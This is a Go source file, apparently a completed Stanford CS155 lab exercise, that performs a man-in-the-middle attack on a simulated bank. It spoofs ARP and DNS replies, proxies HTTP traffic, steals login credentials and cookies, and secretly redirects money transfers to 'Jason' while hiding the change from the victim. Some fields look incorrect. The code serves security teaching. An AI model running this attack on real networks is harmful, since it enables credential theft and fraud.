/*
 * Stanford CS155 Project 3 Networking Part 3. Monster-in-the-Middle Attack
 *
 * mitm.go When completed (by you!) and compiled, this program will:
 *
 * * Intercept and spoof DNS questions for fakebank.com to instead direct the
 *   client towards the attacker's IP.
 *
 * * Act as an HTTP proxy, relaying the client's requests to fakebank.com and
 *   sending fakebank.com's response back to the client... but with an evil
 *   twist.
 *
 * The segments left to you to complete are marked by TODOs. It may be useful
 * to search for them within this file. Lastly, don't dive blindly into coding
 * this part. READ THE STARTER CODE! It is documented in detail for a reason.
 *
 * This project based on the University of Michigan EECS388 Course Project.
 */

// TODO #0: Read through this code in its entirety, to understand its
//          structure and functionality.

package main

// These are the imports we used, but feel free to use anything from gopacket
// or the Go standard libraries. YOU MAY NOT import other third-party
// libraries, as your code may fail to compile on the autograder.
import (
	"fakebank.com/mitm/network" // For `cs155.*` methods
	"bytes"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"golang.org/x/sys/unix"
)

// ==============================
//  ARP MITM PORTION
// ==============================

func startARPServer() {
	// see startDNSServer() for details on these packet operations
	handle, err := pcap.OpenLive("eth0", 1600, true, pcap.BlockForever)
	if err != nil {
		log.Panic(err)
	}
	if err := handle.SetBPFFilter("arp and arp[6:2] = 1"); err != nil { // only grab ARP Request Frames
		log.Panic(err)
	} else {
		defer handle.Close()
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for pkt := range packetSource.Packets() {
			handleARPPacket(pkt)
		}
	}
}

/*
	handleARPPacket detects ARP requests and sends out spoofed ARP responses

	Parameters: a packet captures on the network which may or may not be an ARP packet
*/
func handleARPPacket(packet gopacket.Packet) {
	arpLayer := packet.Layer(layers.LayerTypeARP)
	if arpLayer == nil {
		panic("unable to decode ARP packet")
	}

	// Manually extract the payload of the ARP layer and parse it.
	arpPacketObj := gopacket.NewPacket(arpLayer.LayerContents(), layers.LayerTypeARP, gopacket.Default)


	// Check if the Ethernet frame contains a ARP request within.
	if arpLayer := arpPacketObj.Layer(layers.LayerTypeARP); arpLayer != nil {
		// Type-switch the layer to the correct interface in order to operate on its member variables.
		arpData, _ := arpLayer.(*layers.ARP)

		// Only grab ARP requests that did not originate from us
		if arpData.Operation == 1 && !bytes.Equal(arpData.SourceHwAddress, cs155.GetLocalMAC()) {
			// TODO #1: When the client sends and ARP request, send a spoofed reply
			//          (use ARPIntercept, SpoofARP, and SendRawEther where necessary)
			//
			// Hint:	Store all the data you need in the ARPIntercept struct and
			//			pass it to spoofARP(). spoofARP() returns a slice of bytes,
			//			which can be sent over the wire with sendRawEthernet()
			if net.IP(arpData.DstProtAddress).String() == "10.38.8.2" {
				intercept := ARPIntercept { net.IP(arpData.SourceProtAddress), net.IP(arpData.DstProtAddress), net.HardwareAddr(arpData.SourceHwAddress) }
				sendRawEthernet(spoofARP(intercept))
			}
		}
	}
}

/*
	ARPIntercept stores information from a captured ARP packet
	in order to craft a spoofed ARP reply
*/
type ARPIntercept struct {

	// TODO #2: Figure out what needs to be intercepted from the ARP request
	//          for the DNS server's IP address
	//
	// Hint:	The types net.HardwareAddr and net.IP are the best way to represent
	//			a hardware address and an IP address respectively.
	SourceProtAddress net.IP
	DstProtAddress net.IP
	SourceHwAddress net.HardwareAddr
}

/*
	spoofARP is called by handleARPPAcket upon detection of an ARP request
	for an IP address. Your goal is to make an ARP reply that seems like
	it came from the requested IP address claiming that the requested IP
	can be reached at your MAC address

	Parameters:

	  - intercept, a strict of information about the original ARP request

	  Returns: the spoofed ARP reply as a slice of bytes
*/
func spoofARP(intercept ARPIntercept) []byte {
	// In order to make a packet with the spoofed ARP reply, we need to
	// create a spoofed ARP reply and an Ethernet frame to send it in
	// We will need to fill in the headers for both Ethernet and ARP

	// TODO #3: Fill in the missing fields below to construct your spoofed ARP response
	arp := &layers.ARP{
		AddrType: layers.LinkTypeEthernet,
		Protocol: layers.EthernetTypeIPv4,
		HwAddressSize: 6, // number of bytes in a MAC address
		ProtAddressSize: 4, // number of bytes in an IPv4 address
		Operation: 2, // Indicates this is an ARP reply
		// SourceHwAddress:		TODO,
		SourceHwAddress: cs155.GetLocalMAC(),
		// SourceProtAddress: 	TODO,
		SourceProtAddress: intercept.DstProtAddress,
		// DstHwAddress:		TODO,
		DstHwAddress: intercept.SourceHwAddress,
		// DstProtAddress:		TODO,
		DstProtAddress: intercept.SourceProtAddress,
	}
	ethernet := &layers.Ethernet{
		EthernetType: layers.EthernetTypeARP,
		// SrcMAC:				TODO,
		SrcMAC: cs155.GetLocalMAC(),
		// DstMAC:				TODO,
		DstMAC: intercept.SourceHwAddress,
	}

	// Now that the packet is ready to be sent, we need to "flatten" its
	// different layers into raw bytes to send along the wire.
	// These options will automatically calculate checksums and set them
	// to the correct values
	serializeOpts := gopacket.SerializeOptions{
		FixLengths: true,
		ComputeChecksums: true,
	}

	buf := gopacket.NewSerializeBuffer()

	if err := gopacket.SerializeLayers(buf, serializeOpts, ethernet, arp); err != nil {
		log.Panic(err)
	}
	return buf.Bytes()
}

/*
	sendRawEthernet is a helper function that sends bytes directly over the wire

	Parameters:
	  - toSend, the raw byte to send on the wire
*/
func sendRawEthernet(toSend []byte) {
	// Open aw raw Ethernet socket
	outFD, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, unix.ETH_P_ALL)
	if err != nil {
		log.Panic(err)
	}

	// The man page says we need Protocol, Ifindex, Halen, and Addr
	// But it doesn't seem to be using protocol, halen, or addr
	// Citation: man 7 packet
	addr := unix.SockaddrLinklayer{}
	addr.Protocol = unix.ETH_P_ARP

	inter, _ := net.InterfaceByName("eth0")
	addr.Ifindex = inter.Index

	if err := unix.Sendto(outFD, toSend, 0, &addr); err != nil {
		log.Panic("Sendto: ", err.Error())
	}
	if err := unix.Close(outFD); err != nil {
		log.Panic("Close: ", err.Error())
	}
}

// ==============================
//  DNS MITM PORTION
// ==============================

func startDNSServer() {
	handle, err := pcap.OpenLive("eth0", 1600, true, pcap.BlockForever)
	if err != nil {
		log.Panic(err)
	}
	if err := handle.SetBPFFilter("udp"); err != nil { // only grab UDP packets
		// More on BPF filtering:
		// https://www.ibm.com/support/knowledgecenter/SS42VS_7.4.0/com.ibm.qradar.doc/c_forensics_bpf.html
		log.Panic(err)
	} else {
		// close PCAP connection when program exits
		defer handle.Close()
		// Loop over each UDP packet received
		// Note: This will iterate over _all_ UDP packets.
		// Not all are guaranteed to be DNS packets.
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for pkt := range packetSource.Packets() {
			handleUDPPacket(pkt)
		}
	}
}

/*
	handleUDPPacket detects DNS packets and sends a spoofed DNS response as appropriate.

	Parameters: packet, a packet captured on the network, which may or may not be DNS.
*/
func handleUDPPacket(packet gopacket.Packet) {

	// Due to the BPF filter set in main(), we can assume a UDP layer is present.
	udpLayer := packet.Layer(layers.LayerTypeUDP)
	if udpLayer == nil {
		panic("unable to decode UDP packet")
	}

	// Manually extract the payload of the UDP layer and parse it as DNS.
	payload := udpLayer.(*layers.UDP).Payload
	dnsPacketObj := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default)

	// Check if the UDP packet contains a DNS packet within. Do nothing for non-DNS UDP packets
	if dnsLayer := dnsPacketObj.Layer(layers.LayerTypeDNS); dnsLayer != nil {
		// Type-switch the layer to the correct interface in order to operate on its member variables.
		dnsData, _ := dnsLayer.(*layers.DNS)

		// TODO #4: When the client queries fakebank.com, send a spoofed response.
		//          (use dnsIntercept, spoofDNS, and sendRawUDP where necessary)
		//
		// Hint:    Parse dnsData, then search for an exact match of "fakebank.com". To do
		//          this, you may have to index into an array; make sure its
		//          length is non-zero before doing so!
		//
		// Hint:    In addition, you don't want to respond to your spoofed
		//          response as it travels over the network, so check that the
		//          DNS packet has no answer (also stored in an array).
		//
		// Hint:    Because the payload variable above is a []byte, you may find
		//          this line of code useful when calling spoofDNS, since it requires
		//          a gopacket.Payload type: castPayload := gopacket.Payload(payload)
		var intercept dnsIntercept

		if string(dnsData.Questions[0].Name) == "fakebank.com" && dnsData.Questions[0].Type == layers.DNSTypeA {
			ipLayer := packet.Layer(layers.LayerTypeIPv4)
			ipData, _ := ipLayer.(*layers.IPv4)
			udpData, _ := udpLayer.(*layers.UDP)

			intercept.SrcIP = ipData.SrcIP
			intercept.DstIP = ipData.DstIP
			intercept.SrcPort = udpData.SrcPort
			intercept.DstPort = udpData.DstPort

			buffer_bytes := spoofDNS(intercept, gopacket.Payload(payload))
			sendRawUDP(53, ipData.SrcIP, buffer_bytes)
		}
	}
}

/*
	dnsIntercept stores the pertinent information from a captured DNS packet
	in order to craft a response in spoofDNS.
*/
type dnsIntercept struct {

	// TODO #5: Determine what needs to be intercepted from the DNS request
	//          for fakebank.com in order to craft a spoofed answer.
	SrcIP net.IP
	DstIP net.IP
	SrcPort layers.UDPPort
	DstPort layers.UDPPort
}

/*
	spoofDNS is called by handleUDPPacket upon detection of a DNS request for
	"fakebank.com". Your goal is to make a packet that seems like it came from the
	genuine DNS server, but instead lies to the client that fakebank.com is at the
	attacker's IP address.

	Parameters:

	  - intercept, a struct containing information from the original DNS request
	    packet

	  - payload, the application (DNS) layer from the original DNS request

	Returns: the spoofed DNS answer packet as a slice of bytes
*/
func spoofDNS(intercept dnsIntercept, payload gopacket.Payload) []byte {
	// In order to make a packet containing the spoofed DNS answer, we need
	// to start from layer 3 of the OSI model (IP) and work upwards, filling
	// in the headers of the IP, UDP, and finally DNS layers.

	// TODO #6: Fill in the missing fields below to construct the base layers of
	//          your spoofed DNS packet. If you are confused about what the Protocol
	//          variable means, Google and IANA are your friends!
	ip := &layers.IPv4{
		// fakebank.com operates on IPv4 exclusively.
		Version: 4,
		// Protocol: TODO,
		Protocol: layers.IPProtocolIPv4,
		// SrcIP:    TODO,
		SrcIP: intercept.DstIP,
		// DstIP:    TODO,
		DstIP: intercept.SrcIP,
	}
	udp := &layers.UDP{
		// SrcPort: TODO,
		SrcPort: intercept.DstPort,
		// DstPort: TODO,
		DstPort: intercept.SrcPort,
	}

	// The checksum for the level 4 header (which includes UDP) depends on
	// what level 3 protocol encapsulates it; let UDP know it will be wrapped
	// inside IPv4.
	if err := udp.SetNetworkLayerForChecksum(ip); err != nil {
		log.Panic(err)
	}
	// As long as payload contains DNS layer data, we can convert the
	// sequence of bytes into a DNS data structure.
	dnsPacket := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default).Layer(layers.LayerTypeDNS)
	dns, ok := dnsPacket.(*layers.DNS)
	if !ok {
		log.Panic("Tried to spoof a packet that doesn't appear to have a DNS layer.")
	}

	// TODO #7: Populate the DNS layer (dns) with your answer that points to the attack web server
	//          Your business-minded friends may have dropped some hints elsewhere in the network!
	var answer layers.DNSResourceRecord
	answer.Type = layers.DNSTypeA
	answer.Name = []byte("fakebank.com")
	localIP, _, _ := net.ParseCIDR(cs155.GetLocalIP())
	answer.IP = localIP
	dns.Answers = append(dns.Answers, answer)

	// Now we're ready to seal off and send the packet.
	// Serialization refers to "flattening" a packet's different layers into a
	// raw stream of bytes to be sent over the network.
	// Here, we want to automatically populate length and checksum fields with the correct values.
	serializeOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	buf := gopacket.NewSerializeBuffer()

	if err := gopacket.SerializeLayers(buf, serializeOpts, ip, udp, dns); err != nil {
		log.Panic(err)
	}
	return buf.Bytes()
}

/*
	sendRawUDP is a helper function that sends bytes over UDP to the target host/port
	combination.

	Parameters:
	- port, the destination port.
	- dest, destination IP address.
	- toSend - the raw packet to send over the wire.

	Returns: None

*/
func sendRawUDP(port int, dest []byte, toSend []byte) {
	// Opens an IPv4 socket to destination host/port.
	outFD, _ := unix.Socket(unix.AF_INET, unix.SOCK_RAW,
		unix.IPPROTO_RAW)
	var destArr [4]byte
	copy(destArr[:], dest)
	addr := unix.SockaddrInet4{
		Port: port,
		Addr: destArr,
	}
	if err := unix.Sendto(outFD, toSend, 0, &addr); err != nil {
		log.Panic(err)
	}
	if err := unix.Close(outFD); err != nil {
		log.Panic(err)
	}
}

// ==============================
//  HTTP MITM PORTION
// ==============================

/*
	startHTTPServer sets up a simple HTTP server to masquerade as fakebank.com, once DNS spoofing is successful.
*/
func startHTTPServer() {
	http.HandleFunc("/", handleHTTP)
	log.Panic(http.ListenAndServe(":80", nil))
}

/*
	handleHTTP is called every time an HTTP request arrives and handles the backdoor
	connection to the real fakebank.com.

	Parameters:
	- rw, a "return envelope" for data to be sent back to the client;
	- r, an incoming message from the client
*/
func handleHTTP(rw http.ResponseWriter, r *http.Request) {

	if r.URL.Path == "/kill" {
		os.Exit(1)
	}

	// TODO #8: Handle HTTP requests. Roughly speaking, you should delegate most of the work to
	//          SpoofBankRequest and WriteClientResponse, which handle endpoint-specific tasks,
	//          and use this function for the more general tasks that remain, like stealing cookies
	//          and actually communicating over the network.
	//
	// Hint:    You will want to create an http.Client object to deliver the spoofed
	//          HTTP request, and to capture the real fakebank.com's response.
	//
	// Hint:    Make sure to check for cookies in both the request and response!
	var client *http.Client
	response, _ := client.Do(spoofBankRequest(r))
	if len(response.Cookies()) != 0 {
		for _, cookie := range response.Cookies() {
			cs155.StealServerCookie(cookie.Name, cookie.Value)
		}
	}
	if len(r.Cookies()) != 0 {
		for _, cookie := range r.Cookies() {
			cs155.StealClientCookie(cookie.Name, cookie.Value)
		}
	}
	rw = *writeClientResponse(response, r, &rw)
}

/*
	spoofBankRequest creates the request that is actually sent to fakebank.com.

	Parameters:
	- origRequest, the request received from the bank client.

	Returns: The spoofed packet, ready to be sent to fakebank.com.
*/
func spoofBankRequest(origRequest *http.Request) *http.Request {
	var bankRequest *http.Request
	var bankURL = "http://" + cs155.GetBankIP() + origRequest.RequestURI

	if origRequest.URL.Path == "/login" {

		// TODO #9: Since the client is logging in,
		//          - parse the request's form data,
		//          - steal the credentials,
		//          - make a new request, leaving the values untouched
		//
		// Hint:    Once you parse the form (Google is your friend!), the form
		//          becomes a url.Values object. As a consequence, you cannot
		//          simply reuse origRequest, and must make a new request.
		//          However, url.Values supports member functions Get(), Set(),
		//          and Encode(). Encode() URL-encodes the form data into a string.
		//
		// Hint:    http.NewRequest()'s third parameter, body, is an io.Reader object.
		//          You can wrap the URL-encoded form data into a Reader with the
		//          strings.NewReader() function.
		origRequest.ParseForm()
		var body = strings.NewReader(origRequest.Form.Encode())
		bankRequest, _ = http.NewRequest(origRequest.Method, bankURL, body)
		var username = origRequest.Form.Get("username")
		var password = origRequest.Form.Get("password")
		cs155.StealCredentials(username, password)

	} else if origRequest.URL.Path == "/logout" {

		// Since the client is just logging out, don't do anything major here
		bankRequest, _ = http.NewRequest("POST", bankURL, nil)

	} else if origRequest.URL.Path == "/transfer" {

		// TODO #10: Since the client is transferring money,
		//			- parse the request's form data
		//          - if the form has a key named "to", modify it to "Jason"
		//          - make a new request with the updated form values
		origRequest.ParseForm()
		origRequest.Form.Set("to", "Jason")
		var body = strings.NewReader(origRequest.Form.Encode())
		bankRequest, _ = http.NewRequest(origRequest.Method, bankURL, body)

	} else {

		// Silently pass-through any unidentified requests
		bankRequest, _ = http.NewRequest(origRequest.Method, bankURL, origRequest.Body)
	}

	// Also pass-through the same headers originally provided by the client.
	bankRequest.Header = origRequest.Header
	return bankRequest
}

/*
	writeClientResponse forms the HTTP response to the client, making in-place modifications
	to the response received from the real fakebank.com.

	Parameters:
	- bankResponse, the response from the bank
	- origRequest, the original request from the client
	- writer, the interface where the response is constructed

	Returns: the same ResponseWriter that was provided (for daisy-chaining, if needed)
*/
func writeClientResponse(bankResponse *http.Response, origRequest *http.Request, writer *http.ResponseWriter) *http.ResponseWriter {

	// Pass any cookies set by fakebank.com on to the client.
	if len(bankResponse.Cookies()) != 0 {
		for _, cookie := range bankResponse.Cookies() {
			http.SetCookie(*writer, cookie)
		}
	}

	if origRequest.URL.Path == "/transfer" {

		// TODO #11: Use the original request to change the recipient back to the
		//          value expected by the client.
		//
		// Hint:    Unlike an http.Request object which uses an io.Reader object
		//          as the body, the body of an http.Response object is an io.ReadCloser.
		//          ioutil.ReadAll() takes an io.ReadCloser and outputs []byte.
		//          ioutil.NopCloser() takes an io.Reader and outputs io.ReadCloser.
		//	    strings.ReplaceAll() replaces occurrences of substrings in string.
		//	    You can convert between []bytes and strings via string() and []byte.
		//
		// Hint:    bytes.NewReader() is analogous to strings.NewReader() in the
		//          /login endpoint, where you could wrap a string in an io.Reader.
		origRequest.ParseForm()
		body, _ := ioutil.ReadAll(bankResponse.Body)
		var recipient = origRequest.Form.Get("to")
		var bodyReplaced = strings.ReplaceAll(string(body), "Jason", recipient)
		bankResponse.Body = ioutil.NopCloser(strings.NewReader(bodyReplaced))
	}

	// Now that all changes are complete, write the body
	if _, err := io.Copy(*writer, bankResponse.Body); err != nil {
		log.Fatal(err)
	}

	return writer
}

func main() {

	// The ARP server is run concurrently as a goroutine
	go startARPServer()

	// The DNS server is also run concurrently as a goroutine
	go startDNSServer()

	startHTTPServer()
}
